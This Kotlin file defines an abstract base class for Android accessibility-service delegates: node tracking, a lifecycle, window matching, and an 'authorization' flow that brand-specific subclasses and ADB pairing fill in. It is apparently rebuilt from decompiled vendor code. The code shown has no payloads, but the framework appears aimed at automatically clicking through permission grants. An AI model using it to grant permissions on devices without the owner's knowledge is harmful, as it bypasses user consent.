package com.storm.safe.rock.service.modules.base

import android.content.Context
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.service.MyAccessibilityService

/**
 * Abstract base class for all UI-automation delegates.
 *
 * Mirrors the vendor `AbstractC0330a0` (a0) which provides:
 * - Reference to [MyAccessibilityService] for performGlobalAction etc.
 * - Node tracking via a [LinkedHashSet] with safe recycle-all
 * - Active/inactive lifecycle
 * - Authorization execution framework (success/failure/log tracking)
 * - Abstract event handling for subclasses (brand engines, ADB pairing, etc.)
 *
 * @param tag     Human-readable identifier for logging.
 * @param service The accessibility service instance (may be null during tests).
 * @param context Android context for system service access.
 */
abstract class AccessibilityDelegate(
    val tag: String,
    val service: MyAccessibilityService?,
    val context: Context
) {
    // Secondary constructor for test convenience (no service)
    constructor(tag: String, context: Context) : this(tag, null, context)

    private val trackedNodes = LinkedHashSet<AccessibilityNodeInfo>()

    @Volatile
    var isActive: Boolean = false
        private set

    fun activate() {
        isActive = true
    }

    fun deactivate() {
        isActive = false
    }

    // --- Node tracking (mirrors vendor a0.f53210a2 + a0()) ---

    fun trackNode(node: AccessibilityNodeInfo) {
        synchronized(trackedNodes) { trackedNodes.add(node) }
    }

    fun recycleNodes() {
        synchronized(trackedNodes) {
            for (node in trackedNodes) {
                try { node.recycle() } catch (_: Exception) {}
            }
            trackedNodes.clear()
        }
    }

    fun getTrackedNodeCount(): Int = synchronized(trackedNodes) { trackedNodes.size }

    // --- Authorization execution framework (mirrors vendor a1/executeAuthorization) ---

    data class AuthorizationResult(
        val isSuccess: Boolean,
        val successes: List<String>,
        val failures: List<String>,
        val logs: List<String>
    )

    /**
     * Execute the delegate's authorization flow with structured result tracking.
     * Calls [doExecute] (abstract) and always recycles nodes in finally.
     * Returns [AuthorizationResult] with success/failure lists.
     */
    suspend fun executeAuthorization(): AuthorizationResult {
        val successes = mutableListOf<String>()
        val failures = mutableListOf<String>()
        val logs = mutableListOf<String>()
        try {
            doExecute(successes, failures, logs)
        } catch (e: Exception) {
            android.util.Log.e(tag, "❌ 授权异常: ${e.message}", e)
            failures.add("系统异常: ${e.message}")
        } finally {
            recycleNodes()
        }
        val isSuccess = successes.isNotEmpty() && failures.isEmpty()
        if (!isSuccess && (successes.isNotEmpty() || failures.isNotEmpty())) {
            android.util.Log.w(tag, "⚠️ 授权配置部分失败（完成: ${successes.size}, 失败: ${failures.size}）")
        }
        return AuthorizationResult(isSuccess, successes, failures, logs)
    }

    /**
     * Subclasses implement actual authorization logic here.
     * Add descriptions to [successes] for completed steps, [failures] for errors.
     */
    protected open suspend fun doExecute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        // Default: no-op. Brand engines override this.
    }

    // --- Abstract: subclass responsibilities ---

    abstract fun onAccessibilityEvent(event: AccessibilityEvent, packageName: String, className: String)

    abstract fun getListenWindows(): List<ListenWindow>

    // --- Window matching ---

    fun matchesWindow(packageName: String, className: String): Boolean {
        return getListenWindows().any { it.matches(packageName, className) }
    }

    // --- Service utilities (convenience wrappers) ---

    fun performGlobalAction(action: Int): Boolean {
        return try { service?.performGlobalAction(action) ?: false } catch (_: Exception) { false }
    }

    // --- Lifecycle ---

    open fun dispose() {
        deactivate()
        recycleNodes()
    }
}
